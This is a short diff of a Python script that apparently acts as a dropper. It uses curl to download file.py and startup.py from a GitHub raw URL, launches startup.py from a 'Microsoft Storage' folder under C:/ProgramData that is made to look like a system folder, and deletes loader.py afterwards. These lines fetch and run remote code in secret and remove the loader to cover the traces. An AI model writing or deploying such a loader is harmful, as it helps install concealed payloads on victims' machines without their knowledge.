@@ -10,6 +10,6 @@ os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/m
 os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/file.py")
 os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")
 
-os.system("start startup.py")
+os.system("start C:/ProgramData/Microsoft Storage/startup.py")
 time.sleep(1)
-os.remove("loader.py")
+os.remove("C:/ProgramData/Microsoft Storage/loader.py")
